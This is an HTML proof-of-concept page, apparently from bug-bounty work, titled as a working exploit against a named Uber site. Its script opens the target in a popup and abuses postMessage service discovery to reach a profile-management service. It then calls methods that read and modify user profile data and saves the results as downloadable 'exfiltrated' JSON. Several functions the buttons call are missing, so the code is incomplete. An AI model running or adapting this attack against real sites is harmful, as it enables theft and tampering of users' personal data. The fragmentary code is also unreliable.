<!DOCTYPE html>
<html>
<head>
<title>Working Exploit - All Methods via Profile Service</title>
<style>

</style>
</head>
<body>
<h1> WORKING EXPLOIT - ALL METHODS VIA PROFILE SERVICE</h1>

<div class="stats">
    <div class="stat-box">
        <div class="stat-number" id="methods-count">0</div>
        <div class="stat-label">Methods Called</div>
    </div>
    <div class="stat-box">
        <div class="stat-number" id="data-count">0</div>
        <div class="stat-label">Data Points Exfiltrated</div>
    </div>
    <div class="stat-box">
        <div class="stat-number" id="sensitive-count">0</div>
        <div class="stat-label">Sensitive Data Found</div>
    </div>
</div>

<div class="section">
    <h3>Step 1: Initialize</h3>
    <button onclick="openTarget()">ğŸ¯ Open Uber Site</button>
    <span id="popup-status" class="status disconnected">Not Connected</span>
</div>

<div class="section">
    <h3>Step 2: Connect to Working Service</h3>
    <button class="danger" onclick="connectToWorkingService()">ğŸ”Œ Connect to Profile Service</button>
    <span id="connection-status" class="status disconnected">Not Connected</span>
</div>

<div class="section">
    <h3>Step 3: Exploit All Methods</h3>
    <button class="danger" onclick="exploitAllMethods()">ğŸ’€ EXFILTRATE ALL DATA</button>
    <button onclick="exploitProfileMethods()">ğŸ‘¤ Profile Data Only</button>
    <button onclick="exploitStateMethods()">âš™ï¸ Test getState/setState</button>
    <button class="danger" onclick="testAddSocialLink()">ğŸ”¥ Test ADD SOcial link</button>
    <button onclick="exploitComplianceMethods()">ğŸ”’ Compliance Data</button>
    <button onclick="exploitOnboardingMethods()">ğŸ“‹ Onboarding Data</button>

</div>

<div class="section">
    <h3>ğŸ“‹ Available Exploit Methods (28 total)</h3>
    <div id="methods-list">
        <div class="method-category">
            <div class="category-title">ğŸ‘¤ Profile Data (High Value)</div>
            â€¢ fetchProfileData - Full user profile<br>
            â€¢ getProfileSocialLinks - Social media links<br>
            â€¢ getProfileDraft - Draft profile data<br>
            â€¢ updateUserProfile - Profile modification capability<br>
            â€¢ updateProfileAttributes - Attribute modification
        </div>
        <div class="method-category">
            <div class="category-title">ğŸ“ Draft & Settings</div>
            â€¢ createProfileDraft - Create drafts<br>
            â€¢ updateDraftInterests - Interest data<br>
            â€¢ updateDraftInterestSettings - Settings data<br>
            â€¢ submitProfileDraft - Submit capabilities<br>
            â€¢ abandonProfileDraft - Draft management
        </div>
        <div class="method-category">
            <div class="category-title">ğŸ”— Social & Links</div>
            â€¢ createProfileSocialLink - Add social links<br>
            â€¢ deleteProfileSocialLink - Delete links<br>
            â€¢ updateProfileBio - Bio modification
        </div>
        <div class="method-category">
            <div class="category-title">ğŸ“ Skills & Qualifications</div>
            â€¢ updateQualificationData - Education data<br>
            â€¢ saveSkillsAndExpertise - Skills modification<br>
            â€¢ setLanguageData - Language settings<br>
            â€¢ updateDraftResumeData - Resume data
        </div>
        <div class="method-category">
            <div class="category-title">âš™ï¸ Management & State</div>
            â€¢ openProfileManagement - Open profile UI<br>
            â€¢ closeProfileManagement - Close UI<br>
            â€¢ getState - Internal state<br>
            â€¢ setState - State modification<br>
            â€¢ HEALTH_CHECK - Service status
        </div>
    </div>
</div>

<div class="section">
    <h3>ğŸ“Š Exploitation Log</h3>
    <button onclick="clearLog()" style="background: #666; color: #fff;">Clear Log</button>
    <button onclick="downloadLog()" style="background: #ffd93d; color: #000;">ğŸ’¾ Download Log</button>
    <div id="output"></div>
</div>

<div class="section">
    <h3>ğŸ’ Exfiltrated Data (<span id="exfil-count">0</span> items)</h3>
    <button onclick="downloadExfiltratedData()" style="background: #ffd93d; color: #000;">ğŸ’¾ Download All Data</button>
    <button onclick="showSensitiveOnly()" style="background: #ff6b6b; color: #fff;">ğŸ”¥ Show Sensitive Only</button>
    <div id="stolen-data" class="exfiltrated-data">No data exfiltrated yet...</div>
</div>

<script>
// Configuration - Using YOUR working channel
const TARGET_ORIGIN = "https://earn-uberaisolutions.uber.com";
const SERVICE_DISCOVERY_CHANNEL = "service-discovery";
const TARGET_SERVICE = "f7-kwm-profile-management-service-provider";

let targetWindow = null;
let workingPort = null;
let discoveredChannel = null;
let exfiltratedData = [];
let stats = { methodsCalled: 0, dataPoints: 0, sensitiveData: 0 };

// All methods available on the profile management service
const PROFILE_METHODS = [
    "fetchProfileData",
    "getProfileSocialLinks", 
    "getProfileDraft",
    "updateUserProfile",
    "updateProfileAttributes",
    "createProfileDraft",
    "updateDraftInterests",
    "updateDraftInterestSettings",
    "submitProfileDraft",
    "abandonProfileDraft",
    "createProfileSocialLink",
    "deleteProfileSocialLink",
    "updateProfileBio",
    "updateQualificationData",
    "saveSkillsAndExpertise",
    "setLanguageData",
    "updateDraftResumeData",
    "openProfileManagement",
    "closeProfileManagement",
    "updateDomainPreferences",
    "cancelDomainPreferences",
    "updateNativeLanguage",
    "updateUserSchedule",
    "setInterestSettings",
    "getState",
    "setState",
    "HEALTH_CHECK"
];


const METHOD_CATEGORIES = {
    profile: ["fetchProfileData", "getProfileSocialLinks", "getProfileDraft", "updateUserProfile", "updateProfileAttributes"],
    state: ["getState", "setState"],
    compliance: ["HEALTH_CHECK"],
    onboarding: ["createProfileDraft", "updateDraftInterests", "updateDraftInterestSettings", "submitProfileDraft"]
};

// ============================================================================
// STEP 1: Open Target
// ============================================================================
function openTarget() {
    targetWindow = window.open(TARGET_ORIGIN, 'uberTarget', 'width=1200,height=800');
    
    if (targetWindow) {
        log(' Target window opened', 'success');
        log(' Waiting 3 seconds for page load...', 'info');
        document.getElementById('popup-status').className = 'status connected';
        document.getElementById('popup-status').textContent = 'Connected';
        
        setTimeout(() => {
            log('Ready! Click "Connect to Profile Service"', 'success');
        }, 3000);
    } else {
        log('âŒ Popup blocked! Enable popups.', 'error');
    }
}

// ============================================================================
// STEP 2: Discover Services & Connect
// ============================================================================
function connectToWorkingService() {
    if (!targetWindow) {
        log('Open target first!', 'error');
        return;
    }
    
    log('ğŸ” Step 1: Discovering services...', 'info');
    
    // First discover services to get the actual channel
    targetWindow.postMessage({
        type: "REQUEST_CLIENT_PORT",
        channel: SERVICE_DISCOVERY_CHANNEL,
        requestID: "service-discovery"
    }, TARGET_ORIGIN);
}

// ============================================================================
// Message Handler
// ============================================================================
window.addEventListener('message', function(event) {
    if (event.origin !== TARGET_ORIGIN) return;
    
    if (event.ports && event.ports[0]) {
        const port = event.ports[0];
        const requestID = event.data.requestID;
        
        if (requestID === "service-discovery") {
            log('âœ… Discovery port received', 'success');
            
            port.onmessage = function(portEvent) {
                handleDiscoveryMessage(portEvent);
            };
            port.start();
            
            // Request list of services
            log(' Requesting service list...', 'info');
            setTimeout(() => {
                port.postMessage({ type: "LIST_PROVIDERS" });
            }, 500);
            
        } else if (requestID === "working-connection") {
            workingPort = port;
            log(' CONNECTED! MessagePort received', 'success');
            document.getElementById('connection-status').className = 'status connected';
            document.getElementById('connection-status').textContent = 'Connected';
            
            port.onmessage = function(portEvent) {
                handlePortMessage(portEvent);
            };
            port.start();
            
            log('ğŸ‰ Ready to exploit! Click "EXFILTRATE ALL DATA"', 'success');
        }
    }
});

function handleDiscoveryMessage(portEvent) {
    const data = portEvent.data;
    
    if (data.payload && Array.isArray(data.payload)) {
        log(`ğŸ“‹ Discovered ${data.payload.length} services`, 'success');
        
        // Find our target service
        const targetService = data.payload.find(s => s.type === TARGET_SERVICE);
        
        if (targetService) {
            discoveredChannel = targetService.channelName;
            log(`âœ… Found target: ${TARGET_SERVICE}`, 'success');
            log(`ğŸ“¡ Channel: ${discoveredChannel}`, 'info');
            
            // Now connect to it
            log('ğŸ”Œ Step 2: Connecting to profile service...', 'info');
            setTimeout(() => {
                targetWindow.postMessage({
                    type: "REQUEST_CLIENT_PORT",
                    channel: discoveredChannel,
                    requestID: "working-connection"
                }, TARGET_ORIGIN);
            }, 1000);
        } else {
            log(` Service ${TARGET_SERVICE} not found!`, 'error');
        }
    }
}





function exploitStateMethods() {
    if (!workingPort) {
        log('Connect to service first!', 'error');
        return;
    }
    
    log('\ Testing getState and setState...', 'data');
    log('ğŸ“Š First calling getState to see current state...', 'info');
    
    // Call getState first
    callMethod('getState');
    
    // Then try setState after 2 seconds
    setTimeout(() => {
        log('ğŸ”§ Now trying setState...', 'info');
        callMethod('setState');
    }, 2000);
}

function exploitComplianceMethods() {
    if (!workingPort) {
        log(' Connect to service first!', 'error');
        return;
    }
    
    log('\nğŸ”’ Exfiltrating compliance data...', 'data');
    METHOD_CATEGORIES.compliance.forEach((method, index) => {
        setTimeout(() => callMethod(method), index * 1000);
    });
}

function exploitOnboardingMethods() {
    if (!workingPort) {
        log(' Connect to service first!', 'error');
        return;
    }
    
    log('\nğŸ“‹ Exfiltrating onboarding data...', 'data');
    METHOD_CATEGORIES.onboarding.forEach((method, index) => {
        setTimeout(() => callMethod(method), index * 1000);
    });
}



// ============================================================================
// Handle Responses
// ============================================================================
function handlePortMessage(portEvent) {
    const data = portEvent.data;
    
    // Skip empty OK responses
    if (data.payload === "OK") {
        return;
    }
    
    let method = 'unknown';
    try {
        method = data.requestID ? data.requestID.split('-')[0] : 'unknown';
    } catch (e) {
        method = 'error-extracting-method';
    }
    
    // Handle errors - SAFE VERSION (NO SPREAD SYNTAX)
    if (data.error) {
        console.log('ğŸ” FULL ERROR RESPONSE:');
        console.log(data);
        console.log('ğŸ” ERROR OBJECT:');
        console.log(data.error);
        
        let errorMessage = 'Unknown error';
        
        // Safe error extraction
        if (typeof data.error === 'string') {
            errorMessage = data.error;
        } else if (data.error !== null && typeof data.error === 'object') {
            // Check for common error properties
            if (data.error.message) {
                errorMessage = String(data.error.message);
            } else if (data.error.error) {
                errorMessage = String(data.error.error);
            } else if (data.error.code) {
                errorMessage = 'Error code: ' + String(data.error.code);
            } else {
                // Convert to string safely
                try {
                    errorMessage = JSON.stringify(data.error);
                } catch (e) {
                    errorMessage = 'Complex error object (see console)';
                }
            }
        }
        
        // Log without spread syntax
        log('âŒ ' + method + ' failed: ' + errorMessage, 'error');
        return;
    }
    
    // Handle success
    if (data.payload !== undefined && data.payload !== null) {
        log('âœ… SUCCESS: ' + method, 'success');
        console.log('ğŸ“¥ Response payload:');
        console.log(data.payload);
        
        exfiltratedData.push({
            timestamp: new Date().toISOString(),
            method: method,
            requestID: data.requestID,
            payload: data.payload,
            fullResponse: data
        });
        
        stats.dataPoints++;
        updateStats();
        updateStolenDataDisplay();
    }
}


// ============================================================================
// UI Updates
// ============================================================================
function updateStats() {
    document.getElementById('methods-count').textContent = stats.methodsCalled;
    document.getElementById('data-count').textContent = stats.dataPoints;
    document.getElementById('sensitive-count').textContent = stats.sensitiveData;
}

function updateStolenDataDisplay() {
    const display = document.getElementById('stolen-data');
    document.getElementById('exfil-count').textContent = exfiltratedData.length;
    
    if (exfiltratedData.length === 0) {
        display.textContent = 'No data exfiltrated yet...';
        return;
    }
    
    display.textContent = JSON.stringify(exfiltratedData, null, 2);
}

function showSensitiveOnly() {
    const sensitiveOnly = exfiltratedData.filter(d => d.isSensitive);
    const display = document.getElementById('stolen-data');
    
    if (sensitiveOnly.length === 0) {
        display.textContent = 'No sensitive data found yet...';
        return;
    }
    
    display.textContent = JSON.stringify(sensitiveOnly, null, 2);
    log(` Showing ${sensitiveOnly.length} sensitive data items`, 'data');
}

function downloadExfiltratedData() {
    const blob = new Blob([JSON.stringify(exfiltratedData, null, 2)], {type: 'application/json'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `uber-exfiltrated-data-${Date.now()}.json`;
    a.click();
    log('ğŸ’¾ Downloaded all exfiltrated data', 'success');
}

function downloadLog() {
    const output = document.getElementById('output');
    const blob = new Blob([output.innerText], {type: 'text/plain'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `uber-exploit-log-${Date.now()}.txt`;
    a.click();
    log('ğŸ’¾ Downloaded log file', 'success');
}

// ============================================================================
// Logging
// ============================================================================
function log(message, type = 'info') {
    const output = document.getElementById('output');
    const entry = document.createElement('div');
    entry.className = 'log-entry log-' + type;
    const timestamp = new Date().toLocaleTimeString();
    
    // SAFE: Convert message to string
    let messageText = '';
    if (typeof message === 'string') {
        messageText = message;
    } else {
        try {
            messageText = JSON.stringify(message);
        } catch (e) {
            messageText = String(message);
        }
    }
    
    entry.textContent = '[' + timestamp + '] ' + messageText;
    
    output.appendChild(entry);
    output.scrollTop = output.scrollHeight;
    console.log('[' + type.toUpperCase() + ']', message);
}



// ============================================================================
// Initialize
// ============================================================================
log('ğŸ”“ Working exploit PoC loaded', 'success');
log(`ğŸ¯ Target service: ${TARGET_SERVICE}`, 'info');
log(`ğŸ“Š ${PROFILE_METHODS.length} methods available to exploit`, 'info');
log('âš ï¸  Uses WORKING format: {type: "methodName", requestID: "..."}', 'info');
log('', 'info');
log('STEPS:', 'success');
log('1. Click "Open Uber Site"', 'info');
log('2. Click "Connect to Profile Service" (auto-discovers channel)', 'info');
log('3. Click "EXFILTRATE ALL DATA"', 'info');
</script>
</body>
</html>